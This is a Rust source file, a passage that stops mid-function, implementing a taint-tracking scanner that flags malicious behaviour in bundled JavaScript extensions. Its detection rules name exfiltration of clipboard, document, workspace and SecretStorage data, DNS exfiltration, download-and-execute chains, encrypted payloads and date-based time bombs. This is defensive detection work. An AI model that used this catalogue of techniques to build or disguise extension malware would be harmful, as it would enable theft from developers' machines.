//! JavaScript inspection: scope-aware, flow-insensitive taint tracking over the tree-sitter syntax
//! tree, plus a few syntactic checks. Bundled code is minified, but property names (`readText`,
//! `onDidReceiveMessage`, `writeFileSync`…) and module names in `require("…")` survive, so sources
//! and sinks are recognised by them; local variables are resolved through their scopes so that
//! reused short names in different functions do not mix.

use crate::entropy::shannon;
use std::collections::{HashMap, HashSet};
use tree_sitter::{Node, Parser, Tree};

// Taint labels.
pub const NET: u16 = 1; // network response
pub const CLIP: u16 = 2; // clipboard text
pub const DOC: u16 = 4; // document text
pub const WS: u16 = 8; // workspace files
pub const SECRET: u16 = 16; // SecretStorage values
pub const WEBMSG: u16 = 32; // webview messages
pub const STORAGE: u16 = 64; // extension storage paths
pub const DECODED: u16 = 128; // base64 / hex / char-code decoded text
pub const DECRYPTED: u16 = 256; // decipher output

const MAX_DEPTH: usize = 48;
const ROUNDS: usize = 6;

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum Sink {
    Network,
    Exec,
    Write,
    Chmod,
    Log,
    Command,
    Require,
}

/// One finding in a file: vector, message, position of the sink and (for flows) of the source.
#[derive(Debug, Clone)]
pub struct Hit {
    pub vector: &'static str,
    pub message: String,
    pub line: usize,
    pub col: usize,
    pub source: Option<(usize, usize)>,
    pub confidence: f64,
}

const GLOBAL: u32 = u32::MAX;
type Sym = (u32, String);

struct Scope {
    parent: Option<u32>,
    names: HashSet<String>,
}

#[derive(Clone, Copy, Default)]
struct Taint {
    labels: u16,
    origin: usize,
}

struct Ctx<'a> {
    src: &'a [u8],
    scopes: Vec<Scope>,
    fn_scope: HashMap<usize, u32>,
    taint: HashMap<Sym, Taint>,
    modules: HashMap<Sym, String>,
    handles: HashSet<Sym>,
    /// (targets, value) pairs: declarators and assignments.
    flows: Vec<(Vec<Node<'a>>, Node<'a>)>,
    calls: Vec<Node<'a>>,
}

fn is_function(kind: &str) -> bool {
    matches!(
        kind,
        "function_declaration"
            | "function_expression"
            | "function"
            | "arrow_function"
            | "method_definition"
            | "generator_function_declaration"
            | "generator_function"
    )
}

fn unwrap_expr(mut n: Node) -> Node {
    loop {
        match n.kind() {
            "parenthesized_expression" => match n.named_child(0) {
                Some(c) => n = c,
                None => return n,
            },
            "sequence_expression" => match n.named_child((n.named_child_count() as u32).saturating_sub(1)) {
                Some(c) => n = c,
                None => return n,
            },
            _ => return n,
        }
    }
}

fn named_children(n: Node) -> Vec<Node> {
    let mut c = n.walk();
    n.named_children(&mut c).filter(|x| x.kind() != "comment").collect()
}

fn string_value(n: Node, src: &[u8]) -> Option<String> {
    match n.kind() {
        "string" => {
            let t = n.utf8_text(src).ok()?;
            Some(t.get(1..t.len().saturating_sub(1))?.to_string())
        }
        "template_string" if named_children(n).iter().all(|c| c.kind() != "template_substitution") => {
            let t = n.utf8_text(src).ok()?;
            Some(t.get(1..t.len().saturating_sub(1))?.to_string())
        }
        _ => None,
    }
}

impl<'a> Ctx<'a> {
    fn text(&self, n: Node) -> &'a str {
        n.utf8_text(self.src).unwrap_or("")
    }

    fn short(&self, n: Node, max: usize) -> String {
        let t = self.text(n);
        let mut end = t.len().min(max);
        while !t.is_char_boundary(end) {
            end -= 1;
        }
        let s: String = t[..end].split_whitespace().collect::<Vec<_>>().join(" ");
        if end < t.len() { format!("{s}…") } else { s }
    }

    // ---------- scopes ----------

    fn enclosing_scope(&self, n: Node) -> u32 {
        let mut cur = n.parent();
        while let Some(p) = cur {
            if let Some(&s) = self.fn_scope.get(&p.id()) {
                return s;
            }
            cur = p.parent();
        }
        0
    }

    fn declare_pattern(&mut self, scope: u32, n: Node) {
        match n.kind() {
            "identifier" | "shorthand_property_identifier_pattern" => {
                let name = self.text(n).to_string();
                self.scopes[scope as usize].names.insert(name);
            }
            "assignment_pattern" | "object_assignment_pattern" => {
                if let Some(l) = n.child_by_field_name("left") {
                    self.declare_pattern(scope, l);
                }
            }
            "pair_pattern" => {
                if let Some(v) = n.child_by_field_name("value") {
                    self.declare_pattern(scope, v);
                }
            }
            "object_pattern" | "array_pattern" | "rest_pattern" | "formal_parameters" => {
                for c in named_children(n) {
                    self.declare_pattern(scope, c);
                }
            }
            _ => {}
        }
    }

    fn new_scope(&mut self, n: Node, parent: u32) -> u32 {
        let id = self.scopes.len() as u32;
        self.scopes.push(Scope { parent: Some(parent), names: HashSet::new() });
        self.fn_scope.insert(n.id(), id);
        id
    }

    /// Functions get a scope for `var` and parameters; blocks, loops and `catch` get one for
    /// `let` / `const` / `class`, so an inner `let t` does not merge with an outer `t`.
    fn build_scopes(&mut self, root: Node<'a>) {
        self.scopes.push(Scope { parent: None, names: HashSet::new() });
        self.fn_scope.insert(root.id(), 0);
        // (node, block scope, function scope)
        let mut stack: Vec<(Node<'a>, u32, u32)> = vec![(root, 0, 0)];
        while let Some((n, block, func)) = stack.pop() {
            let (mut inner_block, mut inner_func) = (block, func);
            let kind = n.kind();
            if is_function(kind) && n.id() != root.id() {
                if let Some(name) = n.child_by_field_name("name")
                    && kind.ends_with("declaration")
                {
                    let nm = self.text(name).to_string();
                    self.scopes[block as usize].names.insert(nm);
                }
                let id = self.new_scope(n, block);
                (inner_block, inner_func) = (id, id);
                for field in ["parameters", "parameter"] {
                    if let Some(p) = n.child_by_field_name(field) {
                        self.declare_pattern(id, p);
                    }
                }
            } else if matches!(
                kind,
                "statement_block" | "for_statement" | "for_in_statement" | "catch_clause" | "switch_body" | "class_body"
            ) && n.parent().is_none_or(|p| !is_function(p.kind()))
            {
                inner_block = self.new_scope(n, block);
            }
            match kind {
                "variable_declarator" => {
                    if let Some(name) = n.child_by_field_name("name") {
                        let lexical = n.parent().is_some_and(|p| p.kind() == "lexical_declaration");
                        self.declare_pattern(if lexical { block } else { func }, name);
                        if let Some(v) = n.child_by_field_name("value") {
                            self.flows.push((vec![name], v));
                        }
                    }
                }
                "for_in_statement" => {
                    if let (Some(l), Some(r)) = (n.child_by_field_name("left"), n.child_by_field_name("right")) {
                        let var = n.child_by_field_name("kind").is_some_and(|k| self.text(k) == "var");
                        if n.child_by_field_name("kind").is_some() {
                            self.declare_pattern(if var { func } else { inner_block }, l);
                        }
                        self.flows.push((vec![l], r));
                    }
                }
                "assignment_expression" | "augmented_assignment_expression" => {
                    if let (Some(l), Some(r)) = (n.child_by_field_name("left"), n.child_by_field_name("right")) {
                        self.flows.push((vec![l], r));
                    }
                }
                "catch_clause" => {
                    if let Some(p) = n.child_by_field_name("parameter") {
                        self.declare_pattern(inner_block, p);
                    }
                }
                "class_declaration" => {
                    if let Some(name) = n.child_by_field_name("name") {
                        let nm = self.text(name).to_string();
                        self.scopes[block as usize].names.insert(nm);
                    }
                }
                "import_statement" => self.import(n),
                "call_expression" | "new_expression" => self.calls.push(n),
                _ => {}
            }
            for c in named_children(n).into_iter().rev() {
                stack.push((c, inner_block, inner_func));
            }
        }
    }

    fn import(&mut self, n: Node) {
        let Some(module) = n.child_by_field_name("source").and_then(|s| string_value(s, self.src)) else {
            return;
        };
        let module = module.trim_start_matches("node:").to_string();
        let mut stack = vec![n];
        while let Some(c) = stack.pop() {
            if c.kind() == "identifier" {
                let name = self.text(c).to_string();
                self.scopes[0].names.insert(name.clone());
                self.modules.insert((0, name), module.clone());
            }
            if c.kind() != "string" {
                stack.extend(named_children(c));
            }
        }
    }

    fn resolve(&self, name: &str, at: Node) -> Sym {
        let mut s = Some(self.enclosing_scope(at));
        while let Some(id) = s {
            if self.scopes[id as usize].names.contains(name) {
                return (id, name.to_string());
            }
            s = self.scopes[id as usize].parent;
        }
        (GLOBAL, name.to_string())
    }

    fn sym_of(&self, n: Node) -> Option<Sym> {
        let n = unwrap_expr(n);
        if n.kind() == "identifier" { Some(self.resolve(self.text(n), n)) } else { None }
    }

    /// Symbols a pattern binds (`a`, `{a, b: c}`, `[d]`).
    fn pattern_syms(&self, n: Node, out: &mut Vec<Sym>) {
        match n.kind() {
            "identifier" | "shorthand_property_identifier_pattern" => out.push(self.resolve(self.text(n), n)),
            "assignment_pattern" | "object_assignment_pattern" => {
                if let Some(l) = n.child_by_field_name("left") {
                    self.pattern_syms(l, out)
                }
            }
            "pair_pattern" => {
                if let Some(v) = n.child_by_field_name("value") {
                    self.pattern_syms(v, out)
                }
            }
            "object_pattern" | "array_pattern" | "rest_pattern" | "formal_parameters" => {
                for c in named_children(n) {
                    self.pattern_syms(c, out)
                }
            }
            _ => {}
        }
    }

    // ---------- modules ----------

    /// The module a `require("m")` / `import("m")` / `__toESM(require("m"))` expression loads.
    fn required_module(&self, n: Node, depth: usize) -> Option<String> {
        if depth > 4 {
            return None;
        }
        let n = unwrap_expr(n);
        match n.kind() {
            "call_expression" => {
                let f = unwrap_expr(n.child_by_field_name("function")?);
                let args = named_children(n.child_by_field_name("arguments")?);
                if matches!(self.text(f), "require" | "import" | "__require") {
                    return args.first().and_then(|a| string_value(*a, self.src)).map(|m| m.trim_start_matches("node:").to_string());
                }
                if f.kind() == "import" {
                    return args.first().and_then(|a| string_value(*a, self.src));
                }
                args.first().and_then(|a| self.required_module(*a, depth + 1))
            }
            "member_expression" => self.required_module(n.child_by_field_name("object")?, depth + 1),
            "await_expression" => self.required_module(n.named_child(0)?, depth + 1),
            _ => None,
        }
    }

    fn module_of(&self, n: Node) -> Option<String> {
        let n = unwrap_expr(n);
        match n.kind() {
            "identifier" => self.modules.get(&self.resolve(self.text(n), n)).cloned(),
            "member_expression" => {
                let obj = n.child_by_field_name("object")?;
                let prop = self.text(n.child_by_field_name("property")?);
                let m = self.module_of(obj)?;
                // `fs.promises`, `x.default`
                if prop == "default" {
                    Some(m)
                } else if m == "fs" && prop == "promises" {
                    Some("fs".into())
                } else {
                    None
                }
            }
            _ => self.required_module(n, 0),
        }
    }

    // ---------- calls ----------

    /// (property name, object) for member calls; (identifier, None) for plain calls.
    fn callee(&self, call: Node<'a>) -> (String, Option<Node<'a>>) {
        let field = if call.kind() == "new_expression" { "constructor" } else { "function" };
        let Some(f) = call.child_by_field_name(field) else {
            return (String::new(), None);
        };
        let f = unwrap_expr(f);
        match f.kind() {
            "member_expression" => {
                (f.child_by_field_name("property").map(|p| self.text(p).to_string()).unwrap_or_default(), f.child_by_field_name("object"))
            }
            _ => (self.text(f).to_string(), None),
        }
    }

    fn args(&self, call: Node<'a>) -> Vec<Node<'a>> {
        call.child_by_field_name("arguments").map(named_children).unwrap_or_default()
    }

    /// Labels a call introduces by itself (sources).
    fn source_labels(&self, call: Node<'a>) -> u16 {
        let (name, obj) = self.callee(call);
        let objtext = obj.map(|o| self.text(o)).unwrap_or("");
        let args = self.args(call);
        let mut l = 0;
        match name.as_str() {
            "readText" if objtext.ends_with("clipboard") => l |= CLIP,
            "getText" => l |= DOC,
            "openTextDocument" => l |= DOC,
            "findFiles" if objtext.ends_with("workspace") => l |= WS,
            "readFile" if objtext.ends_with("workspace.fs") => l |= WS,
            "get" if objtext.ends_with("secrets") => l |= SECRET,
            "createDecipheriv" | "createDecipher" => l |= DECRYPTED,
            "atob" | "fromCharCode" => l |= DECODED,
            "from"
                if objtext == "Buffer"
                    && args.get(1).and_then(|a| string_value(*a, self.src)).is_some_and(|e| e == "base64" || e == "hex") =>
            {
                l |= DECODED
            }
            "fetch" if obj.is_none() => l |= NET,
            _ => {}
        }
        if self.is_network_call(call) {
            l |= NET;
        }
        l
    }

    fn net_module(m: &str) -> bool {
        matches!(
            m,
            "http"
                | "https"
                | "http2"
                | "axios"
                | "got"
                | "node-fetch"
                | "needle"
                | "request"
                | "undici"
                | "follow-redirects"
                | "superagent"
        )
    }

    /// Calls that send a request (their arguments leave the machine; their result is a response).
    fn is_network_call(&self, call: Node<'a>) -> bool {
        let (name, obj) = self.callee(call);
        if call.kind() == "new_expression" {
            return matches!(name.as_str(), "WebSocket" | "XMLHttpRequest" | "EventSource");
        }
        match obj {
            None => {
                name == "fetch"
                    || call
                        .child_by_field_name("function")
                        .and_then(|f| self.module_of(f))
                        .is_some_and(|m| Self::net_module(&m) && !matches!(m.as_str(), "http" | "https"))
            }
            Some(o) => {
                let m = self.module_of(o);
                (m.as_deref().is_some_and(Self::net_module)
                    && matches!(name.as_str(), "request" | "get" | "post" | "put" | "patch" | "delete" | "fetch" | "head"))
                    || (m.as_deref().is_some_and(|m| matches!(m, "net" | "tls")) && matches!(name.as_str(), "connect" | "createConnection"))
                    || (matches!(name.as_str(), "write" | "end" | "send") && self.sym_of(o).is_some_and(|s| self.handles.contains(&s)))
            }
        }
    }

    fn sink_kind(&self, call: Node<'a>) -> Option<Sink> {
        let (name, obj) = self.callee(call);
        let objmod = obj.and_then(|o| self.module_of(o));
        let fnmod = if obj.is_none() { call.child_by_field_name("function").and_then(|f| self.module_of(f)) } else { None };
        let cp = objmod.as_deref() == Some("child_process") || fnmod.as_deref() == Some("child_process");
        if self.is_network_call(call) {
            return Some(Sink::Network);
        }
        Some(match name.as_str() {
            "exec" if cp => Sink::Exec,
            "execSync" | "spawn" | "spawnSync" | "execFile" | "execFileSync" | "fork" => Sink::Exec,
            "eval" | "Function" if obj.is_none() => Sink::Exec,
            "runInNewContext" | "runInThisContext" | "runInContext" | "compileFunction" => Sink::Exec,
            "require" | "__require" | "import" if obj.is_none() => {
                let a = self.args(call);
                if a.first().is_some_and(|a| string_value(*a, self.src).is_none()) {
                    Sink::Require
                } else {
                    return None;
                }
            }
            "writeFile" | "writeFileSync" | "appendFile" | "appendFileSync" | "createWriteStream" | "copyFile" | "copyFileSync"
            | "rename" | "renameSync" => Sink::Write,
            "chmod" | "chmodSync" => Sink::Chmod,
            "log" | "info" | "warn" | "error" | "debug" if obj.is_some_and(|o| self.text(o) == "console") => Sink::Log,
            "appendLine" | "append" | "trace" if obj.is_some() => Sink::Log,
            "executeCommand" => Sink::Command,
            _ => return None,
        })
    }

    // ---------- labels ----------

    fn labels(&self, n: Node<'a>, depth: usize) -> Taint {
        if depth > MAX_DEPTH {
            return Taint::default();
        }
        let n = unwrap_expr(n);
        let mut t = Taint::default();
        let add = |t: &mut Taint, o: Taint| {
            if t.labels == 0 && o.labels != 0 {
                t.origin = o.origin;
            }
            t.labels |= o.labels;
        };
        match n.kind() {
            "identifier" | "shorthand_property_identifier" => {
                return self.taint.get(&self.resolve(self.text(n), n)).copied().unwrap_or_default();
            }
            "member_expression" => {
                let txt = self.text(n);
                if txt.len() < 300
                    && ["globalStorageUri", "storageUri", "globalStoragePath", "storagePath"].iter().any(|k| txt.ends_with(k))
                {
                    add(&mut t, Taint { labels: STORAGE, origin: n.start_byte() });
                }
                if let Some(o) = n.child_by_field_name("object") {
                    add(&mut t, self.labels(o, depth + 1));
                }
            }
            "subscript_expression" => {
                if let Some(o) = n.child_by_field_name("object") {
                    add(&mut t, self.labels(o, depth + 1));
                }
            }
            "call_expression" | "new_expression" => {
                let s = self.source_labels(n);
                if s != 0 {
                    add(&mut t, Taint { labels: s, origin: n.start_byte() });
                }
                let (_, obj) = self.callee(n);
                if let Some(o) = obj {
                    add(&mut t, self.labels(o, depth + 1));
                }
                for a in self.args(n) {
                    if !is_function(a.kind()) {
                        add(&mut t, self.labels(a, depth + 1));
                    }
                }
            }
            "function_expression"
            | "arrow_function"
            | "function"
            | "class"
            | "string"
            | "number"
            | "regex"
            | "true"
            | "false"
            | "null"
            | "undefined" => {}
            _ => {
                for c in named_children(n) {
                    add(&mut t, self.labels(c, depth + 1));
                }
            }
        }
        t
    }

    fn taint_sym(&mut self, s: Sym, t: Taint) -> bool {
        if t.labels == 0 {
            return false;
        }
        let e = self.taint.entry(s).or_insert(Taint { labels: 0, origin: t.origin });
        let before = e.labels;
        e.labels |= t.labels;
        e.labels != before
    }

    fn function_params(&self, f: Node) -> Vec<Sym> {
        let mut out = vec![];
        for field in ["parameters", "parameter"] {
            if let Some(p) = f.child_by_field_name(field) {
                // Resolve parameter names from inside the function.
                let mut syms = vec![];
                self.pattern_syms(p, &mut syms);
                for (_, name) in syms {
                    let id = self.fn_scope.get(&f.id()).copied().unwrap_or(GLOBAL);
                    out.push((id, name));
                }
            }
        }
        out
    }

    fn propagate(&mut self) {
        // Module aliases and network handles first: they do not depend on taint.
        for i in 0..self.flows.len() {
            let (targets, value) = self.flows[i].clone();
            if let Some(m) = self.required_module(value, 0).or_else(|| self.module_of(value)) {
                for tnode in &targets {
                    let mut syms = vec![];
                    self.pattern_syms(*tnode, &mut syms);
                    if tnode.kind() == "identifier" {
                        syms = vec![self.resolve(self.text(*tnode), *tnode)];
                    }
                    for s in syms {
                        self.modules.insert(s, m.clone());
                    }
                }
            }
        }
        for i in 0..self.flows.len() {
            let (targets, value) = self.flows[i].clone();
            let v = unwrap_expr(value);
            if matches!(v.kind(), "call_expression" | "new_expression") && self.is_network_call(v) {
                for tnode in &targets {
                    if let Some(s) = self.sym_of(*tnode) {
                        self.handles.insert(s);
                    }
                }
            }
        }
        for _ in 0..ROUNDS {
            let mut changed = false;
            for i in 0..self.flows.len() {
                let (targets, value) = self.flows[i].clone();
                let t = self.labels(value, 0);
                if t.labels == 0 {
                    continue;
                }
                for tnode in targets {
                    let mut syms = vec![];
                    if tnode.kind() == "identifier" {
                        syms.push(self.resolve(self.text(tnode), tnode));
                    } else {
                        self.pattern_syms(tnode, &mut syms);
                    }
                    for s in syms {
                        changed |= self.taint_sym(s, t);
                    }
                }
            }
            for i in 0..self.calls.len() {
                let call = self.calls[i];
                let (name, obj) = self.callee(call);
                let mut cb = Taint::default();
                match name.as_str() {
                    "onDidChangeTextDocument" | "onDidSaveTextDocument" | "onDidOpenTextDocument" | "onWillSaveTextDocument" => {
                        cb = Taint { labels: DOC, origin: call.start_byte() }
                    }
                    // Process streams have an event of the same name; webview messages come via `.webview`.
                    "onDidReceiveMessage" if obj.is_some_and(|o| self.text(o).ends_with("webview")) => {
                        cb = Taint { labels: WEBMSG, origin: call.start_byte() }
                    }
                    _ => {}
                }
                if self.is_network_call(call) {
                    cb.labels |= NET;
                    cb.origin = call.start_byte();
                }
                if let Some(o) = obj {
                    let ot = self.labels(o, 0);
                    if ot.labels != 0 {
                        if cb.labels == 0 {
                            cb.origin = ot.origin;
                        }
                        cb.labels |= ot.labels;
                    }
                }
                if cb.labels == 0 {
                    continue;
                }
                for a in self.args(call) {
                    if is_function(a.kind()) {
                        for s in self.function_params(a) {
                            changed |= self.taint_sym(s, cb);
                        }
                    }
                }
            }
            if !changed {
                break;
            }
        }
    }

    fn pos(&self, byte: usize) -> (usize, usize) {
        let before = &self.src[..byte.min(self.src.len())];
        let line = before.iter().filter(|&&b| b == b'\n').count() + 1;
        let col = byte - before.iter().rposition(|&b| b == b'\n').map(|p| p + 1).unwrap_or(0) + 1;
        (line, col)
    }

    fn syms_in(&self, n: Node<'a>, out: &mut HashSet<Sym>, depth: usize) {
        if depth > MAX_DEPTH {
            return;
        }
        if n.kind() == "identifier" {
            out.insert(self.resolve(self.text(n), n));
            return;
        }
        for c in named_children(n) {
            self.syms_in(c, out, depth + 1);
        }
    }
}

fn flow_vector(label: u16, sink: Sink) -> Option<(&'static str, &'static str, f64)> {
    use Sink::*;
    Some(match (label, sink) {
        (CLIP, Network) => ("ext/clipboard-exfil", "clipboard text", 0.8),
        (DOC, Network) => ("ext/document-exfil", "document text", 0.6),
        (WS, Network) => ("ext/workspace-harvest", "workspace files", 0.7),
        (SECRET, Network | Log | Write) => ("ext/secret-storage-abuse", "a SecretStorage value", 0.8),
        (WEBMSG, Exec | Command | Write | Require) => ("ext/webview-message-exec", "a webview message", 0.7),
        (DECODED, Network) => ("ext/encoded-url", "decoded (base64 / hex / char-code) text", 0.7),
        (DECRYPTED, Exec | Require) => ("ext/encrypted-payload", "decrypted data", 0.9),
        (DECRYPTED, Write) => ("ext/encrypted-payload", "decrypted data", 0.5),
        (NET, Exec | Require) => ("ext/download-exec", "a network response", 0.8),
        _ => return None,
    })
}

fn sink_name(s: Sink) -> &'static str {
    match s {
        Sink::Network => "a network request",
        Sink::Exec => "code / process execution",
        Sink::Write => "a file write",
        Sink::Chmod => "chmod",
        Sink::Log => "a log",
        Sink::Command => "executeCommand",
        Sink::Require => "a dynamic require / import",
    }
}

pub fn parse(src: &[u8]) -> Option<Tree> {
    let mut p = Parser::new();
    p.set_language(&tree_sitter_javascript::LANGUAGE.into()).ok()?;
    p.parse(src, None)
}

const LABELS: [u16; 9] = [NET, CLIP, DOC, WS, SECRET, WEBMSG, STORAGE, DECODED, DECRYPTED];

/// Runs every JavaScript check over one file.
pub fn analyze(src: &[u8]) -> Vec<Hit> {
    let Some(tree) = parse(src) else {
        return vec![];
    };
    let root = tree.root_node();
    let mut cx = Ctx {
        src,
        scopes: vec![],
        fn_scope: HashMap::new(),
        taint: HashMap::new(),
        modules: HashMap::new(),
        handles: HashSet::new(),
        flows: vec![],
        calls: vec![],
    };
    cx.build_scopes(root);
    cx.propagate();

    let mut hits = vec![];
    let mut net_written: Vec<(HashSet<Sym>, Option<String>, usize, usize)> = vec![]; // path syms, literal path, sink byte, origin
    let mut storage_writes = vec![];
    let mut exec_args: Vec<(Node, Sink)> = vec![];
    let mut storage_exec = vec![];
    let calls = cx.calls.clone();
    for &call in &calls {
        let (name, obj) = cx.callee(call);
        // `res.pipe(fs.createWriteStream(p))`
        if name == "pipe"
            && let (Some(o), Some(arg)) = (obj, cx.args(call).first().copied())
        {
            let a = unwrap_expr(arg);
            let ot = cx.labels(o, 0);
            if ot.labels & NET != 0
                && a.kind() == "call_expression"
                && cx.callee(a).0 == "createWriteStream"
                && let Some(p) = cx.args(a).first().copied()
            {
                let mut syms = HashSet::new();
                cx.syms_in(p, &mut syms, 0);
                net_written.push((syms, string_value(p, src), call.start_byte(), ot.origin));
            }
        }
        // DNS lookups of host names built at run time.
        if matches!(name.as_str(), "lookup" | "resolve" | "resolve4" | "resolve6" | "resolveTxt" | "resolveAny" | "resolveCname")
            && obj.and_then(|o| cx.module_of(o)).is_some_and(|m| m == "dns" || m == "dns/promises")
            && let Some(a) = cx.args(call).first()
        {
            let a = unwrap_expr(*a);
            if a.kind() == "template_string" && named_children(a).iter().any(|c| c.kind() == "template_substitution")
                || a.kind() == "binary_expression" && cx.text(a).contains('.')
            {
                let (line, col) = cx.pos(call.start_byte());
                hits.push(Hit {
                    vector: "ext/dns-exfil",
                    message: format!("DNS lookup of a host name built at run time (`{}`)", cx.short(call, 90)),
                    line,
                    col,
                    source: None,
                    confidence: 0.7,
                });
            }
        }
        let Some(sink) = cx.sink_kind(call) else {
            continue;
        };
        let args = cx.args(call);
        // Which arguments carry the data: writes → content; commands → arguments after the id.
        let data: Vec<Node> = match sink {
            Sink::Write if name == "createWriteStream" => vec![],
            Sink::Write => args.iter().skip(1).copied().collect(),
            Sink::Command => args.iter().skip(1).copied().collect(),
            _ => args.clone(),
        };
        if matches!(sink, Sink::Exec | Sink::Chmod | Sink::Require) {
            for a in &args {
                exec_args.push((*a, sink));
            }
        }
        let path_taint = args.first().map(|a| cx.labels(*a, 0)).unwrap_or_default();
        if path_taint.labels & STORAGE != 0 {
            match sink {
                Sink::Write => storage_writes.push(call.start_byte()),
                Sink::Exec | Sink::Require => storage_exec.push(call.start_byte()),
                _ => {}
            }
        }
        let mut t = Taint::default();
        for a in &data {
            let at = cx.labels(*a, 0);
            if t.labels == 0 {
                t.origin = at.origin;
            }
            t.labels |= at.labels;
        }
        if sink == Sink::Write
            && t.labels & NET != 0
            && let Some(p) = args.first()
        {
            let mut syms = HashSet::new();
            cx.syms_in(*p, &mut syms, 0);
            net_written.push((syms, string_value(*p, src), call.start_byte(), t.origin));
        }
        if sink == Sink::Network && name != "write" && name != "end" && name != "send" {
            // Only the URL / host decides `encoded-url`, not the body.
            let url = args.first().map(|a| cx.labels(*a, 0)).unwrap_or_default();
            t.labels = (t.labels & !DECODED) | (url.labels & DECODED);
        }
        for label in LABELS {
            if t.labels & label == 0 {
                continue;
            }
            if let Some((vector, what, conf)) = flow_vector(label, sink) {
                let (line, col) = cx.pos(call.start_byte());
                hits.push(Hit {
                    vector,
                    message: format!("{what} flows into {} (`{}`)", sink_name(sink), cx.short(call, 90)),
                    line,
                    col,
                    source: Some(cx.pos(t.origin)),
                    confidence: conf,
                });
            }
        }
    }
    // A downloaded file that is later executed or made executable.
    for (paths, literal, sink_byte, origin) in &net_written {
        for (a, kind) in &exec_args {
            let mut used = HashSet::new();
            cx.syms_in(*a, &mut used, 0);
            let same_literal = literal.as_ref().is_some_and(|l| cx.text(*a).contains(l.as_str()));
            if same_literal || used.iter().any(|s| paths.contains(s) && s.0 != GLOBAL) {
                let (line, col) = cx.pos(a.start_byte());
                let (wl, _) = cx.pos(*sink_byte);
                hits.push(Hit {
                    vector: "ext/download-exec",
                    message: format!("a downloaded file (written at line {wl}) is passed to {} (`{}`)", sink_name(*kind), cx.short(*a, 60)),
                    line,
                    col,
                    source: Some(cx.pos(*origin)),
                    confidence: 0.9,
                });
                break;
            }
        }
    }
    if let (Some(&w), Some(&e)) = (storage_writes.first(), storage_exec.first()) {
        let (line, col) = cx.pos(e);
        hits.push(Hit {
            vector: "ext/storage-payload",
            message: "writes into extension storage and executes / requires a file from it".into(),
            line,
            col,
            source: Some(cx.pos(w)),
            confidence: 0.7,
        });
    }
    syntactic(&cx, root, &mut hits);
    hits
}

// ---------- syntactic checks ----------

const KNOWN_BLOB_PREFIXES: [&str; 8] = ["iVBOR", "R0lGOD", "/9j/", "AGFzbQ", "d09GR", "T1RUTw", "AAEAAA", "PHN2Zy"];

fn syntactic(cx: &Ctx, root: Node, hits: &mut Vec<Hit>) {
    let mut activate_fns: HashSet<usize> = HashSet::new();
    let mut named_fns: HashMap<String, usize> = HashMap::new();
    let mut activate_refs: Vec<String> = vec![];
    let mut open_external: Vec<Node> = vec![];
    let mut entropy_hits = 0usize;
    let mut first_entropy: Option<(usize, usize, usize, f64)> = None;
    let mut stack = vec![root];
    while let Some(n) = stack.pop() {
        match n.kind() {
            "string_fragment" => {
                let t = cx.text(n);
                if (100..=200_000).contains(&t.len())
                    && !t.contains(' ')
                    && !KNOWN_BLOB_PREFIXES.iter().any(|p| t.starts_with(p))
                    && !t.starts_with("sha")
                    && !t.starts_with("data:")
                {
                    let h = shannon(t.as_bytes());
                    if h >= 5.2 {
                        entropy_hits += 1;
                        if first_entropy.is_none() {
                            let (l, c) = cx.pos(n.start_byte());
                            first_entropy = Some((l, c, t.len(), h));
                        }
                    }
                }
            }
            "binary_expression" => {
                if let Some(h) = time_bomb(cx, n) {
                    hits.push(h);
                }
            }
            "function_declaration" => {
                if let Some(name) = n.child_by_field_name("name") {
                    named_fns.insert(cx.text(name).to_string(), n.id());
                    if cx.text(name) == "activate" {
                        activate_fns.insert(n.id());
                    }
                }
            }
            "method_definition" => {
                if n.child_by_field_name("name").is_some_and(|x| cx.text(x) == "activate") {
                    activate_fns.insert(n.id());
                }
            }
            "pair" => {
                let key = n.child_by_field_name("key").map(|k| cx.text(k).trim_matches(|c| c == '"' || c == '\'').to_string());
                if key.as_deref() == Some("activate")
                    && let Some(v) = n.child_by_field_name("value").map(unwrap_expr)
                {
                    match v.kind() {
                        "identifier" => activate_refs.push(cx.text(v).to_string()),
                        "arrow_function" => match v.child_by_field_name("body").map(unwrap_expr) {
                            Some(b) if b.kind() == "identifier" => activate_refs.push(cx.text(b).to_string()),
                            _ => {
                                activate_fns.insert(v.id());
                            }
                        },
                        k if is_function(k) => {
                            activate_fns.insert(v.id());
                        }
                        _ => {}
                    }
                }
            }
            "assignment_expression" => {
                if let (Some(l), Some(r)) = (n.child_by_field_name("left"), n.child_by_field_name("right"))
                    && cx.text(l).ends_with(".activate")
                {
                    let r = unwrap_expr(r);
                    if is_function(r.kind()) {
                        activate_fns.insert(r.id());
                    } else if r.kind() == "identifier" {
                        activate_refs.push(cx.text(r).to_string());
                    }
                }
            }
            "call_expression" if cx.callee(n).0 == "openExternal" => {
                open_external.push(n);
            }
            _ => {}
        }
        stack.extend(named_children(n));
    }
    for r in activate_refs {
        if let Some(&id) = named_fns.get(&r) {
            activate_fns.insert(id);
        }
    }
    for call in open_external {
        let mut cur = call.parent();
        while let Some(p) = cur {
            if is_function(p.kind()) {
                if activate_fns.contains(&p.id()) {
                    let (line, col) = cx.pos(call.start_byte());
                    hits.push(Hit {
                        vector: "ext/open-external-startup",
                        message: format!("`activate` opens an external URL on startup (`{}`)", cx.short(call, 80)),
                        line,
                        col,
                        source: None,
                        confidence: 0.7,
                    });
                }
                break;
            }
            cur = p.parent();
        }
    }
    if let Some((line, col, len, h)) = first_entropy {
        hits.push(Hit {
            vector: "ext/high-entropy-string",
            message: format!("{entropy_hits} high-entropy literal(s), the first {len} characters at {h:.2} bits/char"),
            line,
            col,
            source: None,
            confidence: 0.6,
        });
    }
}

/// `Date.now() > 1767225600000`, `new Date() >= new Date("2027-01-01")`.
fn time_bomb(cx: &Ctx, n: Node) -> Option<Hit> {
    let op = n.child_by_field_name("operator").map(|o| cx.text(o))?;
    if !matches!(op, "<" | ">" | "<=" | ">=") {
        return None;
    }
    let (l, r) = (unwrap_expr(n.child_by_field_name("left")?), unwrap_expr(n.child_by_field_name("right")?));
    let now = |x: Node| {
        let t = cx.text(x);
        t.len() < 80
            && (t.contains("Date.now()") || t == "new Date" || t == "new Date()" || t.ends_with("new Date().getTime()") || t == "+new Date")
    };
    let fixed = |x: Node| -> bool {
        match x.kind() {
            "number" => cx.text(x).replace('_', "").parse::<f64>().is_ok_and(|v| (1.5e12..4.1e12).contains(&v)),
            "new_expression" | "call_expression" => {
                let t = cx.text(x);
                (t.starts_with("new Date(") || t.starts_with("Date.parse(") || t.starts_with("Date.UTC("))
                    && cx.args(x).first().is_some_and(|a| matches!(a.kind(), "string" | "number"))
            }
            _ => false,
        }
    };
